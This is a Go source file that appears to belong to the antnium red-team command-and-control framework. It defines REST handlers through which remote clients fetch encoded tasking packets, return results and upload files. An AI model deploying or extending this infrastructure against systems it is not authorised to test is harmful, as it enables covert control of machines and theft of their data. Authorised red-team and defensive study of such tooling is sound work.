package server

import (
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

type ConnectorRest struct {
	coder      model.Coder
	middleware *Middleware
	campaign   *campaign.Campaign
}

func MakeConnectorRest(campaign *campaign.Campaign, middleware *Middleware) ConnectorRest {
	c := ConnectorRest{
		campaign:   campaign,
		middleware: middleware,
		coder:      model.MakeCoder(campaign),
	}
	return c
}

// getPacket provides a client with new packets, if any
func (s *ConnectorRest) getPacket(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	computerId := vars["computerId"]

	if computerId == "" {
		return
	}

	packet, ok := s.middleware.ClientGetPacket(computerId, r.RemoteAddr, "rest")
	if !ok {
		// No packet, just return
		return
	}

	// Encode the packet and send it
	jsonData, err := s.coder.EncodeData(packet)
	if err != nil {
		return
	}

	log.WithFields(log.Fields{
		"1_computerId":   packet.ComputerId,
		"2_packetId":     packet.PacketId,
		"3_downstreamId": packet.DownstreamId,
		"4_packetType":   packet.PacketType,
		"5_arguments":    packet.Arguments,
	}).Info("ToClient   ")

	fmt.Fprint(rw, string(jsonData))
}

// sendPacket receives packet answers from client
func (s *ConnectorRest) sendPacket(rw http.ResponseWriter, r *http.Request) {
	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("Could not read body")
		return
	}
	packet, err := s.coder.DecodeData(reqBody)
	if err != nil {
		log.Error("Could not decode")
		return
	}

	log.WithFields(log.Fields{
		"1_computerId":   packet.ComputerId,
		"2_packetId":     packet.PacketId,
		"3_downstreamId": packet.DownstreamId,
		"4_packetType":   packet.PacketType,
		"5_arguments":    packet.Arguments,
		"6_response":     "...",
	}).Info("FromClient ")

	s.middleware.ClientSendPacket(packet, r.RemoteAddr, "rest")

	fmt.Fprint(rw, "asdf")
}

func (s *ConnectorRest) uploadFile(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	packetId := vars["packetId"]

	s.middleware.ClientUploadFile(packetId, r.Body)

	fmt.Fprintf(w, "ok\n")
}
